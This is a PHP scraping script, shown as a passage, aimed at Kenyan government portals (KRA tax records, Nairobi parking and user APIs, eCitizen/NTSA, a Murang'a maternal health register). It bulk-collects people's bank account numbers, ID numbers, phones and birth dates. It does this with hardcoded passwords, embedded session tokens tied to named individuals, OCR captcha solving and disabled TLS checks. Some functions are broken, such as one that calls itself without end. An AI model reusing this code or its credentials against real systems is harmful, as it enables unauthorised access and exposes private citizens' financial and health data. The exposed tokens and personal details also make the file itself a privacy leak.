    $data['alt_lr_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#txtAltAdResidentAddr td.whitepapartdBig', 0)->plaintext);
    $data['alt_building'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#txtAltAdResidentAddr td.whitepapartdBig', 1)->plaintext);
    $data['alt_street_road'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#txtAltAdResidentAddr td.whitepapartdBig', 2)->plaintext);
    $data['alt_city_town'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#txtAltAdResidentAddr td.whitepapartdBig', 3)->plaintext);
    $data['alt_county'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#txtAltAdResidentAddr td.whitepapartdBig', 4)->plaintext);
    $data['alt_district'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#txtAltAdResidentAddr td.whitepapartdBig', 5)->plaintext);
    $data['alt_tax_area'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#txtAltAdResidentAddr td.whitepapartdBig', 6)->plaintext);
    $data['alt_descriptive_address'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#txtAltAdResidentAddr td.whitepapartdBig', 7)->plaintext);
    $data['alt_postal_code'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#txtAltAdResidentAddr td.whitepapartdBig', 8)->plaintext);
    $data['alt_town'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#txtAltAdResidentAddr td.whitepapartdBig', 9)->plaintext);
    $data['alt_po_box'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#txtAltAdResidentAddr td.whitepapartdBig', 10)->plaintext);

    $data['alt_telephone_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#alterAddDtls fieldset td.whitepapartdBig', 0)->plaintext);
    $data['alt_mobile_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#alterAddDtls fieldset td.whitepapartdBig', 1)->plaintext);
    $data['alt_email'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldstAlter div#alterAddDtls fieldset td.whitepapartdBig', 2)->plaintext);

    $data['bank_declaration'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldStBank fieldset td.whitepapartdBig', 0)->plaintext);

    $data['bank_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldStBank div#divBankAccountDtls td.whitepapartdBig', 0)->plaintext);
    $data['bank_branch_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldStBank div#divBankAccountDtls td.whitepapartdBig', 1)->plaintext);
    $data['bank_city'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldStBank div#divBankAccountDtls td.whitepapartdBig', 2)->plaintext);
    $data['bank_acc_holder_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldStBank div#divBankAccountDtls td.whitepapartdBig', 3)->plaintext);
    $data['bank_acc_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table div#fldStBank div#divBankAccountDtls td.whitepapartdBig', 4)->plaintext);

    $data['tax_obligation'] = strip_tags($st2->find('div.panelGridHead tr#page2 tr tbody tr.whitepapartdBig td', 0)->plaintext);
    $dt_auth = $st2->find('div.panelGridHead tr#page2 tr tbody tr.whitepapartdBig td', 1);
    if (isset($dt_auth->plaintext)) {
        $data['tax_reg_date'] = strip_tags($st2->find('div.panelGridHead tr#page2 tr tbody tr.whitepapartdBig td', 1)->plaintext);
        $data['itax_rollout_date'] = strip_tags($st2->find('div.panelGridHead tr#page2 tr tbody tr.whitepapartdBig td', 2)->plaintext);
    }

    //Page 3 skipped -- section for Partnership, Corporate and Trusts Information dtls -- section Source of Income and Type of Business Activity data

    //Page 4 skipped -- section Partnership, Corporate and Trusts Information data

    //Page 5 skipped -- section Agent authorized to submit tax returns on behalf taxpayers

    return $data;
}


function httpPost($url, $data, $headers = null, $cookie_jar = null, $verif = true, $resp = true)
{
    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        if (is_array($data)) {
            $format_data = http_build_query($data);
        } else {
            $format_data = $data;
        }
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $format_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        if (!$verif) {
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Disable hostname verification
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        }
        if ($headers != null) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_jar);
        $response = curl_exec($ch);
        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    if ($resp) {
        return $response;
    } else {
        return true;
    }
}

function httpGet($url, $data, $headers = null, $cookie_jar = null)
{
    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_jar);
        if ($headers != null) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }

        $response = curl_exec($ch);
        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $response;
}

function httpUpload($url, $data, $headers = null, $cookie_jar = null)
{
    /*
    $data = [
        "curr_password" => "2405",
        "email" => "waroruaalex@tsavo.store",
        "firstname" => "Alex",
        "lastname" => "Waroruaa",
        "password" => '$2y$10$eLBwu6e0.SIkFya2eW8KNONGuyH3EkdsfLEF3FdWEMQyui5TKV2Fm',
        "photo" => curl_file_create($fname, 'image/jpg', 'receipt.jpg'),
        "save" => "",
    ];
    // */
    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        if ($headers != null) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_jar);
        $response = curl_exec($ch);
        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $response;
}

function csrf_capture()
{
    $script = process_1();
    //$script = file_get_contents('./csrf.html');
    $f_href = (new HtmlDocument())->load($script)->find('a.truncate', 0)->{'data-csrf'};


    return $f_href;
}
function myErrorHandler($errno, $errstr, $errfile, $errline)
{
    echo "<b>Custom error:</b> [$errno] $errstr<br>";
    echo " Error on line $errline in $errfile<br>";
}


function citizen_a($url, $data)
{
    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        # sending manually set cookie
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: _single_signon_key=" . readkey("_single_signon_key") . "; Path=/; Expires=Sun, 07 Jan 2030 11:23:18 GMT;"));
        $response = curl_exec($ch);
        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $response;
}

function build_file($file, $data)
{

    $file_data = fopen($file, "w");

    fwrite($file_data, $data);

    fclose($file_data);
}

//set_error_handler("myErrorHandler");

//error_reporting(0);

function nrs_data()
{
    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://nairobiservices.go.ke/api/authentication/auth/users',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_HTTPHEADER => array(
            'Cookie: csrftoken=wLXkotHfgESsspXuCg3gRCXjfZQkmJkm54LFueIhJv67UqihJZ0RZuHc416zDGLH; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ODYzLCJpZF9udW1iZXIiOm51bGwsImtyYV9waW4iOiJQMDUxNjg3Mjk4RyIsImVtYWlsIjoiQUxNSVJJQUtFQEdNQUlMLkNPTSIsInBhc3Nwb3J0IjpudWxsLCJ1c2VybmFtZSI6IkFsbWlyaWEgTHRkIiwiZXhwIjoxNjgxNDY0NTgwLCJjdXN0b21lcl9pZCI6IjIwMjBfMDEzODIiLCJtb2JpbGVfbnVtYmVyIjoiMjU0NzExNTc2OTA5In0.DagH4XZzzA9tUNrZ3Ykg0zlrCEDXOzDFjes7k91yw4U'
        ),
    ));

    $data = curl_exec($curl);

    curl_close($curl);

    $dt1 = json_decode($data, true);

    if (is_array($dt1)) {
        if (isset($dt1['data']['onstreet'])) {
            if (count($dt1['data']['onstreet']) > 1) {
                $file = './dtt.json';

                $file_data = fopen($file, "w");

                fwrite($file_data, $data);

                fclose($file_data);

                return 'Users Data Done </br>';;
            } else {
                build_file('./nrs_data_error.json', $data);
                return 'Count Error 3, Processing Users Data :<b></b></br>';;
            }
        } else {
            build_file('./nrs_data_error.json', $data);
            return 'Object Error 2, Processing Users Data :<b></b></br>';;
        }
    } else {
        build_file('./nrs_data_error.json', $data);
        return 'Error Processing Users Data :<b></b></br>';;
    }
}

function dailyParkingData()
{
    $url = 'https://nairobiservices.go.ke/api/parking/parking/daily/transactions';
    $data = [];
    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        # sending manually set cookie
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MTQ5MTgxLCJpZF9udW1iZXIiOiI4NTM2ODAyIiwia3JhX3BpbiI6bnVsbCwiZW1haWwiOiJ2Y2tvbXJvQGdtYWlsLmNvbSIsInBhc3Nwb3J0IjpudWxsLCJ1c2VybmFtZSI6IkdFT1JHRSAgQUxCRVJUIE9NT1JFIE1BR09IQSIsImV4cCI6MTY3NDk1OTYwMCwiY3VzdG9tZXJfaWQiOiIyMDIwXzE0NzIxMyIsIm1vYmlsZV9udW1iZXIiOiIwNzIyNTI3OTMzIn0.qseGg-p2oYCF3tF0kQVBODqGx2h5ieYZBHa337OIpbc; Path=/; Expires=Sun, 07 Jan 2024 11:23:18 GMT;"));
        $response = curl_exec($ch);
        if (is_array(json_decode($response, true))) {
            $file = './dailyParking.json';

            $file_data = fopen($file, "w");

            fwrite($file_data, $response);

            fclose($file_data);

            return 'Daily Parking Data Done </br>';;
        } else {
            build_file('./dailyParking_error.json', $response);
            return 'Error Processing Daily Parking Data:<b></b> </br>';;
        }





        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return 'Daily Parking Data Done </br>';;
}

function seasonalParkingData()
{
    $url = 'https://nairobiservices.go.ke/api/parking/parking/seasonal/transactions';
    $data = [];
    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        # sending manually set cookie
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MTQ5MTgxLCJpZF9udW1iZXIiOiI4NTM2ODAyIiwia3JhX3BpbiI6bnVsbCwiZW1haWwiOiJ2Y2tvbXJvQGdtYWlsLmNvbSIsInBhc3Nwb3J0IjpudWxsLCJ1c2VybmFtZSI6IkdFT1JHRSAgQUxCRVJUIE9NT1JFIE1BR09IQSIsImV4cCI6MTY3NDk1OTYwMCwiY3VzdG9tZXJfaWQiOiIyMDIwXzE0NzIxMyIsIm1vYmlsZV9udW1iZXIiOiIwNzIyNTI3OTMzIn0.qseGg-p2oYCF3tF0kQVBODqGx2h5ieYZBHa337OIpbc; Path=/; Expires=Sun, 07 Jan 2024 11:23:18 GMT;"));

        $response = curl_exec($ch);

        $file = './seasonalParking.json';

        $file_data = fopen($file, "w");

        fwrite($file_data, $response);

        fclose($file_data);


        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return 'Seasonal Parking Data Done </br>';
}

function vipList()
{
    $url = 'https://nairobiservices.go.ke/api/parking/vip/list_vip';
    $data = [];
    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        # sending manually set cookie
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MTQ5MTgxLCJpZF9udW1iZXIiOiI4NTM2ODAyIiwia3JhX3BpbiI6bnVsbCwiZW1haWwiOiJ2Y2tvbXJvQGdtYWlsLmNvbSIsInBhc3Nwb3J0IjpudWxsLCJ1c2VybmFtZSI6IkdFT1JHRSAgQUxCRVJUIE9NT1JFIE1BR09IQSIsImV4cCI6MTY3NDk1OTYwMCwiY3VzdG9tZXJfaWQiOiIyMDIwXzE0NzIxMyIsIm1vYmlsZV9udW1iZXIiOiIwNzIyNTI3OTMzIn0.qseGg-p2oYCF3tF0kQVBODqGx2h5ieYZBHa337OIpbc; Path=/; Expires=Sun, 07 Jan 2024 11:23:18 GMT;"));

        $response = curl_exec($ch);

        $file = './vip_list.json';

        $file_data = fopen($file, "w");

        fwrite($file_data, $response);

        fclose($file_data);


        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return 'VIP List Data Done </br>';
}


function img_res($path, $width, $height, $extension)
{
    $image_name =  $path;
    //$image = imagecreatefrompng($image_name);

    $image = call_user_func_array('imagecreatefrom' . $extension, [$image_name]);
    $imgResized = imagescale($image, $width, $height);
    $file = './memory/img' . time() . '.' . $extension;

    //imagepng($imgResized, $file); //for png
    call_user_func_array('image' . $extension, [$imgResized, $file]); //for png

    return $file;
}

function kra_verif($kra_link)
{

    $myfile = img_res($kra_link, 700, 150, 'png');

    $arith = (new TesseractOCR($myfile))->userPatterns('./memory/patterns.txt')->allowlist(range(0, 9), '-+?')->run();
    unlink($myfile);
    $dt1 = str_replace(' ', '', $arith);
    $dt2 = str_replace('?', '', $dt1);

    $haystack = $dt2;
    $needle   = '+';

    if (str_contains($haystack, $needle)) {

        $dt3 = strstr($dt2, '+');
        $dt4 = str_replace('+', '', $dt3);

        return (int)$dt2 - (int)$dt4;
    } else {

        $dt3 = strstr($dt2, '-');
        $dt4 = str_replace('-', '', $dt3);

        return (int)$dt2 - (int)$dt4;
    }
}


function removeBeforeWord($string, $word)
{
    $pos = strpos($string, $word);
    if ($pos !== false) {
        return substr($string, $pos);
    } else {
        return $string;
    }
}

function removeAfterWord($string, $word)
{
    $pos = strpos($string, $word);
    if ($pos !== false) {
        return substr($string, 0, $pos + strlen($word));
    } else {
        return $string;
    }
}

function murangaLoginToken()
{

    $url = 'https://health.muranga.go.ke/user-login';

    $cookiesFile = './cookies/XSRF-TOKEN-MURANGA.txt';

    $file_data = fopen($cookiesFile, "w");

    fwrite($file_data, '');

    fclose($file_data);

    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_COOKIEJAR, realpath($cookiesFile)); // write
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        # sending manually set cookie

        $response = curl_exec($ch);
        $f_href = (new HtmlDocument())->load($response)->find('input[name="_token"]', 0)->value . PHP_EOL;

        $pattern = '/\s*/m';
        $replace = '';
        $removedLinebaksAndWhitespace = preg_replace($pattern, $replace, $f_href);

        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $removedLinebaksAndWhitespace;
}
function murangaXSRFtoken()
{
    $cookiesFile = './cookies/XSRF-TOKEN-MURANGA.txt';
    if (file_exists($cookiesFile)) {
        $dt1 = file_get_contents($cookiesFile);
    } else {
        // murangaLoginToken();
        $dt1 = file_get_contents($cookiesFile);
    }

    $dt2 = str_replace('XSRF-TOKEN', '', removeBeforeWord($dt1, 'XSRF-TOKEN'));
    $pattern = '/\s*/m';
    $replace = '';
    $removedLinebaksAndWhitespace = preg_replace($pattern, $replace, $dt2);

    return $removedLinebaksAndWhitespace;
}

function murangaLaraveltoken()
{
    $cookiesFile = './cookies/XSRF-TOKEN-MURANGA.txt';
    if (file_exists($cookiesFile)) {
        $dt1 = file_get_contents($cookiesFile);
    } else {
        //murangaLoginToken();
        $dt1 = file_get_contents($cookiesFile);
    }

    $dt2 = str_replace('laravel_session', '', removeBeforeWord($dt1, 'laravel_session'));
    $dt3 = str_replace('health.muranga.go.ke', '', removeAfterWord($dt2, 'health.muranga.go.ke'));
    $pattern = '/\s*/m';
    $replace = '';
    $removedLinebaksAndWhitespace = preg_replace($pattern, $replace, $dt3);

    return $removedLinebaksAndWhitespace;
}

function murangaLogin()
{
    $url = 'https://health.muranga.go.ke/user-login';
    $data = [
        '_token' => murangaLoginToken(),
        'id_no' => '30348328',
        'password' => 'vnRCnR5Zk4bwKe6'
    ];

    $cookiesFile = './cookies/TOKEN-MURANGA.txt';

    $file_data = fopen($cookiesFile, "w");

    fwrite($file_data, '');

    fclose($file_data);

    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Cookie: laravel_session=' . murangaLaraveltoken() . '; Path=/; Expires=Sun, 07 Jan 2030 11:23:18 GMT;', 'Cookie: XSRF-TOKEN=' . murangaXSRFtoken() . '; Path=/; Expires=Sun, 07 Jan 2030 11:23:18 GMT;']);
        curl_setopt($ch, CURLOPT_COOKIEFILE, realpath($cookiesFile));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, true);

        $response = curl_exec($ch);
        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $response;
}

function startsWith($word, $characters)
{
    return strpos($word, $characters) === 0;
}


function murangaLoggedInTokens()
{
    $dt1 = murangaLogin();
    $dt2 = str_replace('<!DOCTYPE html>', '', removeAfterWord($dt1, '<!DOCTYPE html>'));
    $dt2 = str_replace('HTTP/2 200', '', removeBeforeWord($dt2, 'HTTP/2 200'));
    $pattern = '/\s*/m';
    $replace = '';

    $xsrf_1 = str_replace('XSRF-TOKEN=', '', removeBeforeWord($dt2, 'XSRF-TOKEN='));
    $xsrf_1 = str_replace('set-cookie:', '', removeAfterWord($xsrf_1, 'set-cookie:'));
    $xsrf_1 = preg_replace($pattern, $replace, $xsrf_1);

    $laravel_1 = str_replace('laravel_session=', '', removeBeforeWord($dt2, 'laravel_session='));
    $laravel_1 = str_replace('x-frame-options:', '', removeAfterWord($laravel_1, 'x-frame-options:'));
    $laravel_1 = preg_replace($pattern, $replace, $laravel_1);

    return [$xsrf_1, $laravel_1];
}

function murangaMother()
{
    $url = 'https://health.muranga.go.ke/mothers-report';
    $dt1 = httpGet($url, [], ['Cookie: laravel_session=' . murangaLoggedInTokens()[1] . '; Path=/; Expires=Sun, 07 Jan 2030 11:23:18 GMT;', 'Cookie: XSRF-TOKEN=' . murangaLoggedInTokens()[0] . '; Path=/; Expires=Sun, 07 Jan 2030 11:23:18 GMT;']);

    $f_href = (new HtmlDocument())->load($dt1)->find('table#page-length-option tbody tr');
    $dy2 = [];
    foreach ($f_href as $row) {
        $d_href = $row->outertext;
        $dt2 = (new HtmlDocument())->load($d_href)->find('tr td');
        $dt2_1 = [];
        $pattern = '/\s*/m';
        $replace = '';
        foreach ($dt2 as $id2 => $row2) {
            if ($id2 == 0) {
                $dt2_1['position'] = $row2->innertext;
            } elseif ($id2 == 1) {
                $dt2_1['FullNames'] = $row2->innertext;
            } elseif ($id2 == 2) {
                $dt2_1['IDNumber'] = $row2->innertext;
            } elseif ($id2 == 3) {
                $dt2_1['PhoneNo'] = $row2->innertext;
            } elseif ($id2 == 4) {
                $dt2_1['DOB'] = $row2->innertext;
            } elseif ($id2 == 5) {
                $dt2_1['Constituency'] = $row2->innertext;
            } elseif ($id2 == 6) {
                $dt2_1['Ward'] = $row2->innertext;
            } elseif ($id2 == 7) {
                $dt2_1['PollingStation'] = $row2->innertext;
            } elseif ($id2 == 8) {
                $dt2_1['Facility'] = $row2->innertext;
            } elseif ($id2 == 9) {
                $dt2_1['AntiNatalVisits'] = $row2->innertext;
            } elseif ($id2 == 10) {
                $dt2_1['DateOfAssesment'] = $row2->innertext;
            } elseif ($id2 == 11) {
                $dt2_1['NextVisit'] = $row2->innertext;
            } elseif ($id2 == 12) {
                $dt2_1['RegisteredBy'] = $row2->innertext;
            } elseif ($id2 == 13) {
                $dt2_1['VerifiedBy'] = $row2->innertext;
            } elseif ($id2 == 14) {
                $dt2_1['Paid'] = $row2->innertext;
            } elseif ($id2 == 15) {
                $dt2_1['TransactionDate'] = $row2->innertext;
            } elseif ($id2 == 16) {
                $dt2_16 = $row2->innertext;
                $dt2_16 = (new HtmlDocument())->load($dt2_16)->find('a', 0)->href . PHP_EOL;
                if (!startsWith($dt2_16, 'https://health.muranga.go.ke/vet-mother?id=')) {
                    $dt2_1['id'] = '';
                } else {
                    $dt2_16 = str_replace('https://health.muranga.go.ke/vet-mother?id=', '', $dt2_16);
                    $dt2_1['id'] = preg_replace($pattern, $replace, $dt2_16);
                }
            }
        }
        array_push($dy2, $dt2_1);
    }

    build_file('./murangawomen.json', json_encode($dy2));

    //return $f_href;
    return 'Murang\'a Mother Done!<br/>';
}


/////////////////////////ADDITIONs


function authorizeNTSA()
{
    global $httpClient;

    $fields = [
        '_csrf_token' => authorizeNTSA(),

        'auth[pwd]' => '24051786',
        'auth[username]' => 'Waroruaalex640@gmail.com',
    ];

    $url = 'https://accounts.ecitizen.go.ke/login';

    login($url, $fields);

    $url = 'https://accounts.ecitizen.go.ke/authorize?return_url=https%3A%2F%2Fntsa.pesaflow.com%2Fauth%2Fsso%2Fredirect%3Fredirect_to%3D%2Fswitcher&request_logger=';

    $cookiesFile = './cookies/_single_signon_key_authorize_NTSA.txt';

    $file_data = fopen($cookiesFile, "w");

    fwrite($file_data, '');

    fclose($file_data);

    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_COOKIEJAR, realpath($cookiesFile)); // write
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        # sending manually set cookie
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: _single_signon_key=" . readkey("_single_signon_key_login") . "; Path=/; Expires=Sun, 07 Jan 2030 11:23:18 GMT;"));

        $response = curl_exec($ch);



        $skip = intval(curl_getinfo($ch, CURLINFO_HEADER_SIZE));
        $responseHeader = substr($response, 0, $skip);
        $data_b =  substr($response, $skip);

        $f_href = (new HtmlDocument())->load($response)->find('input[name="_csrf_token"]', 0)->value . PHP_EOL;

        $pattern = '/\s*/m';
        $replace = '';
        $removedLinebaksAndWhitespace = preg_replace($pattern, $replace, $f_href);

        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $removedLinebaksAndWhitespace;
    //return $response;
}

function process_1_NTSA()
{

    $data = [
        '_csrf_token' => authorize(),

        'allow' => '1',
    ];

    $url = 'https://accounts.ecitizen.go.ke/authorize?return_url=https%3A%2F%2Fntsa.pesaflow.com%2Fauth%2Fsso%2Fredirect%3Fredirect_to%3D%2Fswitcher&request_logger=';

    $cookiesFile = './cookies/_single_signon_key_process_1_NTSA.txt';

    $file_data = fopen($cookiesFile, "w");

    fwrite($file_data, '');

    fclose($file_data);

    build_file($cookiesFile, '');


    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_COOKIEJAR, realpath($cookiesFile)); // write
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, true);

        # sending manually set cookie
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: _single_signon_key=" . readkey("_single_signon_key_authorize") . "; Path=/; Expires=Sun, 07 Jan 2030 11:23:18 GMT;"));
        $response = curl_exec($ch);

        $skip = intval(curl_getinfo($ch, CURLINFO_HEADER_SIZE));
        $responseHeader = substr($response, 0, $skip);
        $data_b =  substr($response, $skip);

        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $response;
}


function read_NTSA_automkey()
{
    process_1_NTSA();
    $file = './cookies/_single_signon_key_process_1_NTSA.txt';
    $dt1 = file_get_contents($file);
    $dt1 = str_replace('_automzero_key', '', removeBeforeWord($dt1, '_automzero_key'));
